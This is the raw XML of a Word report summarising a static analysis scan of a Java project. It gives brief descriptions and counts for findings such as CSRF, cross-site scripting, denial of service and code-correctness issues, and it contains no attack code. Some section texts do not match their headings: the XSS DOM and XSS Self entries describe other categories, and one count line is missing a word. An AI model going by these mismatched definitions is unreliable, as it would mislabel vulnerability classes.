      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="4E46F641">
        <w:rPr>
          <w:lang w:val="it-IT"/>
        </w:rPr>
        <w:t>Overwrite</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="20DE3158" w14:textId="77777777" w:rsidR="00910649" w:rsidRPr="005432B6" w:rsidRDefault="001A39A9">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="6"/>
        </w:numPr>
        <w:spacing w:after="120"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Poor Error Handling: Empty Catch Block</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="651F34A6" w14:textId="77777777" w:rsidR="00910649" w:rsidRPr="005432B6" w:rsidRDefault="001A39A9">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="6"/>
        </w:numPr>
        <w:spacing w:after="120"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>Poor Error Handling: Overly Broad Catch</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="348E32B7" w14:textId="77777777" w:rsidR="00910649" w:rsidRPr="005432B6" w:rsidRDefault="001A39A9" w:rsidP="4E46F641">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="6"/>
        </w:numPr>
        <w:spacing w:after="120"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Poor Error Handling: Overly Broad Throws</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="72BBB56A" w14:textId="77777777" w:rsidR="00910649" w:rsidRPr="005432B6" w:rsidRDefault="001A39A9">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="6"/>
        </w:numPr>
        <w:spacing w:after="120"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Poor Logging Practice: Use of a System Output Stream</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="256E267E" w14:textId="77777777" w:rsidR="00910649" w:rsidRDefault="001A39A9">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="6"/>
        </w:numPr>
        <w:spacing w:after="120"/>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="4E46F641">
        <w:rPr>
          <w:lang w:val="it-IT"/>
        </w:rPr>
        <w:t>Poor</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="4E46F641">
        <w:rPr>
          <w:lang w:val="it-IT"/>
        </w:rPr>
        <w:t xml:space="preserve"> Style: </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="4E46F641">
        <w:rPr>
          <w:lang w:val="it-IT"/>
        </w:rPr>
        <w:t>Confusing</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="4E46F641">
        <w:rPr>
          <w:lang w:val="it-IT"/>
        </w:rPr>
        <w:t xml:space="preserve"> Naming</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="215252FA" w14:textId="77777777" w:rsidR="00910649" w:rsidRDefault="001A39A9">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="6"/>
        </w:numPr>
        <w:spacing w:after="120"/>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="4E46F641">
        <w:rPr>
          <w:lang w:val="it-IT"/>
        </w:rPr>
        <w:t>Poor</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="4E46F641">
        <w:rPr>
          <w:lang w:val="it-IT"/>
        </w:rPr>
        <w:t xml:space="preserve"> Style: Value </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="4E46F641">
        <w:rPr>
          <w:lang w:val="it-IT"/>
        </w:rPr>
        <w:t>Never</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="4E46F641">
        <w:rPr>
          <w:lang w:val="it-IT"/>
        </w:rPr>
        <w:t xml:space="preserve"> Read</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="32989550" w14:textId="77777777" w:rsidR="00910649" w:rsidRDefault="001A39A9" w:rsidP="4E46F641">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="6"/>
        </w:numPr>
        <w:spacing w:after="120"/>
        <w:rPr>
          <w:lang w:val="it-IT"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="4E46F641">
        <w:rPr>
          <w:lang w:val="it-IT"/>
        </w:rPr>
        <w:t>Portability</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="4E46F641">
        <w:rPr>
          <w:lang w:val="it-IT"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="4E46F641">
        <w:rPr>
          <w:lang w:val="it-IT"/>
        </w:rPr>
        <w:t>Flaw</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="4E46F641">
        <w:rPr>
          <w:lang w:val="it-IT"/>
        </w:rPr>
        <w:t xml:space="preserve">: Locale </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="4E46F641">
        <w:rPr>
          <w:lang w:val="it-IT"/>
        </w:rPr>
        <w:t>Dependent</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="4E46F641">
        <w:rPr>
          <w:lang w:val="it-IT"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="4E46F641">
        <w:rPr>
          <w:lang w:val="it-IT"/>
        </w:rPr>
        <w:t>Comparison</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="7C5C03F6" w14:textId="77777777" w:rsidR="00910649" w:rsidRDefault="001A39A9" w:rsidP="4E46F641">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="6"/>
        </w:numPr>
        <w:spacing w:after="120"/>
        <w:rPr>
          <w:lang w:val="it-IT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="4E46F641">
        <w:rPr>
          <w:lang w:val="it-IT"/>
        </w:rPr>
        <w:t xml:space="preserve">Privacy </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="4E46F641">
        <w:rPr>
          <w:lang w:val="it-IT"/>
        </w:rPr>
        <w:t>Violation</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="69C407C1" w14:textId="77777777" w:rsidR="00910649" w:rsidRDefault="001A39A9">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="6"/>
        </w:numPr>
        <w:spacing w:after="120"/>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="4E46F641">
        <w:rPr>
          <w:lang w:val="it-IT"/>
        </w:rPr>
        <w:t>Redundant</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="4E46F641">
        <w:rPr>
          <w:lang w:val="it-IT"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="4E46F641">
        <w:rPr>
          <w:lang w:val="it-IT"/>
        </w:rPr>
        <w:t>Null</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="4E46F641">
        <w:rPr>
          <w:lang w:val="it-IT"/>
        </w:rPr>
        <w:t xml:space="preserve"> Check</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4E8F5203" w14:textId="77777777" w:rsidR="00910649" w:rsidRDefault="001A39A9">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="6"/>
        </w:numPr>
        <w:spacing w:after="120"/>
      </w:pPr>
      <w:r>
        <w:t>Resource Injection</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="065E13B5" w14:textId="77777777" w:rsidR="00910649" w:rsidRDefault="001A39A9">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="6"/>
        </w:numPr>
        <w:spacing w:after="120"/>
      </w:pPr>
      <w:r>
        <w:t>System Information Leak</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7ED7578C" w14:textId="77777777" w:rsidR="00910649" w:rsidRDefault="001A39A9" w:rsidP="4E46F641">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="6"/>
        </w:numPr>
        <w:spacing w:after="120"/>
        <w:rPr>
          <w:lang w:val="it-IT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="4E46F641">
        <w:rPr>
          <w:lang w:val="it-IT"/>
        </w:rPr>
        <w:t xml:space="preserve">System Information Leak: </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="4E46F641">
        <w:rPr>
          <w:lang w:val="it-IT"/>
        </w:rPr>
        <w:t>Internal</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="33E9DB16" w14:textId="77777777" w:rsidR="00910649" w:rsidRDefault="001A39A9">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="6"/>
        </w:numPr>
        <w:spacing w:after="120"/>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="4E46F641">
        <w:rPr>
          <w:lang w:val="it-IT"/>
        </w:rPr>
        <w:t>Unchecked</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="4E46F641">
        <w:rPr>
          <w:lang w:val="it-IT"/>
        </w:rPr>
        <w:t xml:space="preserve"> Return Value</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5D5CD29A" w14:textId="77777777" w:rsidR="00910649" w:rsidRDefault="001A39A9">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="6"/>
        </w:numPr>
        <w:spacing w:after="120"/>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="4E46F641">
        <w:rPr>
          <w:lang w:val="it-IT"/>
        </w:rPr>
        <w:t>Unreleased</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="4E46F641">
        <w:rPr>
          <w:lang w:val="it-IT"/>
        </w:rPr>
        <w:t xml:space="preserve"> Resource: Streams</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="42C9B369" w14:textId="77777777" w:rsidR="00910649" w:rsidRDefault="001A39A9" w:rsidP="4E46F641">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="6"/>
        </w:numPr>
        <w:spacing w:after="120"/>
        <w:rPr>
          <w:lang w:val="it-IT"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="4E46F641">
        <w:rPr>
          <w:lang w:val="it-IT"/>
        </w:rPr>
        <w:t>Weak</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="4E46F641">
        <w:rPr>
          <w:lang w:val="it-IT"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="4E46F641">
        <w:rPr>
          <w:lang w:val="it-IT"/>
        </w:rPr>
        <w:t>Cryptographic</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="4E46F641">
        <w:rPr>
          <w:lang w:val="it-IT"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="4E46F641">
        <w:rPr>
          <w:lang w:val="it-IT"/>
        </w:rPr>
        <w:t>Hash</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="23DE523C" w14:textId="77777777" w:rsidR="00910649" w:rsidRDefault="00910649">
      <w:pPr>
        <w:spacing w:after="120"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="52E56223" w14:textId="77777777" w:rsidR="00910649" w:rsidRDefault="00910649">
      <w:pPr>
        <w:spacing w:after="120"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="07547A01" w14:textId="77777777" w:rsidR="00910649" w:rsidRDefault="00910649">
      <w:pPr>
        <w:spacing w:after="120"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7AE2A9F2" w14:textId="5AC93E54" w:rsidR="00910649" w:rsidRPr="005432B6" w:rsidRDefault="001A39A9" w:rsidP="00FE6C60">
      <w:pPr>
        <w:pStyle w:val="Titolo3"/>
      </w:pPr>
      <w:bookmarkStart w:id="7" w:name="_Toc200039245"/>
      <w:r w:rsidRPr="00886CE8">
        <w:t>Build Misconfiguration: External Maven Dependency Repository</w:t>
      </w:r>
      <w:bookmarkEnd w:id="7"/>
    </w:p>
    <w:p w14:paraId="3FB13DB0" w14:textId="77777777" w:rsidR="00910649" w:rsidRPr="005432B6" w:rsidRDefault="001A39A9">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>The “Build Misconfiguration: External Maven Dependency Repository” error occurs when a project uses unapproved or misconfigured external Maven repositories.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="35888AF5" w14:textId="77777777" w:rsidR="00910649" w:rsidRPr="005432B6" w:rsidRDefault="001A39A9">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Only one with low criticality is present in the scan.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1EE54D1E" w14:textId="54BAD323" w:rsidR="00910649" w:rsidRPr="005432B6" w:rsidRDefault="001A39A9" w:rsidP="00886CE8">
      <w:pPr>
        <w:pStyle w:val="Titolo3"/>
      </w:pPr>
      <w:bookmarkStart w:id="8" w:name="_Toc200039246"/>
      <w:r w:rsidRPr="005432B6">
        <w:t>Code Correctness: Class Does Not Implement Equivalence Method</w:t>
      </w:r>
      <w:bookmarkEnd w:id="8"/>
    </w:p>
    <w:p w14:paraId="3206EC58" w14:textId="77777777" w:rsidR="00910649" w:rsidRPr="005432B6" w:rsidRDefault="001A39A9">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">The error “Code Correctness: Class Does Not Implement Equivalence Method” indicates that a class does not correctly implement the </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>equals(</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">) and/or </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>hashCode</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>() methods, which are critical for comparing objects in Java.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5E61EA7B" w14:textId="77777777" w:rsidR="00910649" w:rsidRPr="005432B6" w:rsidRDefault="001A39A9">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>Only one with low criticality is present in the scan.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5E92B574" w14:textId="6D673566" w:rsidR="00910649" w:rsidRPr="005432B6" w:rsidRDefault="001A39A9" w:rsidP="00886CE8">
      <w:pPr>
        <w:pStyle w:val="Titolo3"/>
      </w:pPr>
      <w:bookmarkStart w:id="9" w:name="_Toc200039247"/>
      <w:r w:rsidRPr="005432B6">
        <w:t xml:space="preserve">Code Correctness: </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="005432B6">
        <w:t>clone(</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="005432B6">
        <w:t>) Invokes Overridable Function</w:t>
      </w:r>
      <w:bookmarkEnd w:id="9"/>
    </w:p>
    <w:p w14:paraId="6A0C7503" w14:textId="77777777" w:rsidR="00910649" w:rsidRPr="005432B6" w:rsidRDefault="001A39A9">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">The error “Code Correctness: </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>clone(</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>) Invokes Overridable Function” indicates that the clone() method in a class is calling a method that can be overridden, which can lead to unexpected behavior or bugs when cloning objects.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="26F7AC40" w14:textId="77777777" w:rsidR="00910649" w:rsidRPr="005432B6" w:rsidRDefault="001A39A9">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Fifteen were found in the scan, all with low criticality.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2517D23F" w14:textId="58975B8C" w:rsidR="00910649" w:rsidRPr="005432B6" w:rsidRDefault="001A39A9" w:rsidP="00886CE8">
      <w:pPr>
        <w:pStyle w:val="Titolo3"/>
      </w:pPr>
      <w:bookmarkStart w:id="10" w:name="_Toc200039248"/>
      <w:r w:rsidRPr="005432B6">
        <w:t>Code Correctness: Constructor Invokes Overridable Function</w:t>
      </w:r>
      <w:bookmarkEnd w:id="10"/>
    </w:p>
    <w:p w14:paraId="449DBA0A" w14:textId="77777777" w:rsidR="00910649" w:rsidRPr="005432B6" w:rsidRDefault="001A39A9">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>The error “Code Correctness: Constructor Invokes Overridable Function” indicates that a constructor is calling a method that can be overridable, i.e., is not final, private, or static, which can cause unexpected behavior or bugs, especially in subclasses.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5B3C2279" w14:textId="77777777" w:rsidR="00910649" w:rsidRPr="005432B6" w:rsidRDefault="001A39A9">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Eighteen were found in the scan, all with low criticality.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="08855E2D" w14:textId="5162CFF4" w:rsidR="00910649" w:rsidRPr="005432B6" w:rsidRDefault="001A39A9" w:rsidP="00886CE8">
      <w:pPr>
        <w:pStyle w:val="Titolo3"/>
      </w:pPr>
      <w:bookmarkStart w:id="11" w:name="_Toc200039249"/>
      <w:r w:rsidRPr="005432B6">
        <w:t>Code Correctness: Non-Static Inner Class Implements Serializable</w:t>
      </w:r>
      <w:bookmarkEnd w:id="11"/>
    </w:p>
    <w:p w14:paraId="6A78B130" w14:textId="77777777" w:rsidR="00910649" w:rsidRPr="005432B6" w:rsidRDefault="001A39A9">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>The error “Code Correctness: Non-Static Inner Class Implements Serializable” indicates that a non-static inner class implements Serializable, which can lead to serialization problems.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3F3C3A2A" w14:textId="77777777" w:rsidR="00910649" w:rsidRPr="005432B6" w:rsidRDefault="001A39A9">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Two were found in the scan, all with low criticality.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="186FFCA5" w14:textId="5D773097" w:rsidR="00910649" w:rsidRPr="005432B6" w:rsidRDefault="001A39A9" w:rsidP="00886CE8">
      <w:pPr>
        <w:pStyle w:val="Titolo3"/>
      </w:pPr>
      <w:bookmarkStart w:id="12" w:name="_Toc200039250"/>
      <w:r w:rsidRPr="005432B6">
        <w:t>Cross-Site Request Forgery</w:t>
      </w:r>
      <w:bookmarkEnd w:id="12"/>
    </w:p>
    <w:p w14:paraId="05D74D64" w14:textId="77777777" w:rsidR="00910649" w:rsidRPr="005432B6" w:rsidRDefault="001A39A9">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>The “Cross-Site Request Forgery” (CSRF) error or warning refers to a well-known security vulnerability in web applications. It means that the site or API is vulnerable to a CSRF attack, which can allow an attacker to perform unauthorized actions on behalf of the authenticated user.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="69C8CFA3" w14:textId="77777777" w:rsidR="00910649" w:rsidRPr="005432B6" w:rsidRDefault="001A39A9">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Eight were found in the scan, all with low criticality.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6D935378" w14:textId="702D0C11" w:rsidR="00910649" w:rsidRPr="005432B6" w:rsidRDefault="001A39A9" w:rsidP="00886CE8">
      <w:pPr>
        <w:pStyle w:val="Titolo3"/>
      </w:pPr>
      <w:bookmarkStart w:id="13" w:name="_Toc200039251"/>
      <w:r w:rsidRPr="005432B6">
        <w:t>Cross-Site Scripting: DOM</w:t>
      </w:r>
      <w:bookmarkEnd w:id="13"/>
    </w:p>
    <w:p w14:paraId="11011839" w14:textId="77777777" w:rsidR="00910649" w:rsidRPr="005432B6" w:rsidRDefault="001A39A9">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>The “Cross-Site Scripting: Self” (or XSS: Self) error indicates a Cross-Site Scripting vulnerability in which the application injects user-generated or app-generated content into the DOM without sanitization, in the same domain.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="51C87FDE" w14:textId="77777777" w:rsidR="00910649" w:rsidRPr="005432B6" w:rsidRDefault="001A39A9">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>There are three in the scan, all with criticality.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="30AFFF6A" w14:textId="095878A7" w:rsidR="00910649" w:rsidRPr="005432B6" w:rsidRDefault="001A39A9" w:rsidP="00886CE8">
      <w:pPr>
        <w:pStyle w:val="Titolo3"/>
      </w:pPr>
      <w:bookmarkStart w:id="14" w:name="_Toc200039252"/>
      <w:r w:rsidRPr="005432B6">
        <w:lastRenderedPageBreak/>
        <w:t>Cross-Site Scripting: Self</w:t>
      </w:r>
      <w:bookmarkEnd w:id="14"/>
    </w:p>
    <w:p w14:paraId="4740CFE2" w14:textId="77777777" w:rsidR="00910649" w:rsidRPr="005432B6" w:rsidRDefault="001A39A9">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>The “Cross-Site Scripting: Poor Validation” error indicates that the application validates or filters user input poorly, not effectively preventing the injection of malicious code (XSS).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="447019BA" w14:textId="77777777" w:rsidR="00910649" w:rsidRPr="005432B6" w:rsidRDefault="001A39A9">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Only one with low criticality is present in the scan.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5E62D021" w14:textId="1F390186" w:rsidR="00910649" w:rsidRPr="005432B6" w:rsidRDefault="001A39A9" w:rsidP="00886CE8">
      <w:pPr>
        <w:pStyle w:val="Titolo3"/>
      </w:pPr>
      <w:bookmarkStart w:id="15" w:name="_Toc200039253"/>
      <w:r w:rsidRPr="005432B6">
        <w:t>Dead Code: Expression is Always true</w:t>
      </w:r>
      <w:bookmarkEnd w:id="15"/>
    </w:p>
    <w:p w14:paraId="78299CF6" w14:textId="77777777" w:rsidR="00910649" w:rsidRPr="005432B6" w:rsidRDefault="001A39A9">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>The “Dead Code: Expression is Always true” error indicates that a Boolean expression is useless because it is always true (or always false), thus rendering part of the code useless or inaccessible.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2B7B31CF" w14:textId="77777777" w:rsidR="00910649" w:rsidRPr="005432B6" w:rsidRDefault="001A39A9">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Three were present in the scan, all with low criticality.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="31A0A92C" w14:textId="203337FB" w:rsidR="00910649" w:rsidRPr="005432B6" w:rsidRDefault="001A39A9" w:rsidP="00886CE8">
      <w:pPr>
        <w:pStyle w:val="Titolo3"/>
      </w:pPr>
      <w:bookmarkStart w:id="16" w:name="_Toc200039254"/>
      <w:r w:rsidRPr="005432B6">
        <w:t>Denial of Service</w:t>
      </w:r>
      <w:bookmarkEnd w:id="16"/>
    </w:p>
    <w:p w14:paraId="54817A00" w14:textId="77777777" w:rsidR="00910649" w:rsidRPr="005432B6" w:rsidRDefault="001A39A9">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>The “Denial of Service” (DoS) error signals that some part of the code can be exploited to block, slow down, or crash the system. This happens when the application performs intensive, insecure or poorly controlled operations, especially on untrusted input.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="654D8AA5" w14:textId="77777777" w:rsidR="00910649" w:rsidRPr="005432B6" w:rsidRDefault="001A39A9">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Four were found in the scan, all with low criticality.</w:t>
      </w:r>
    </w:p>
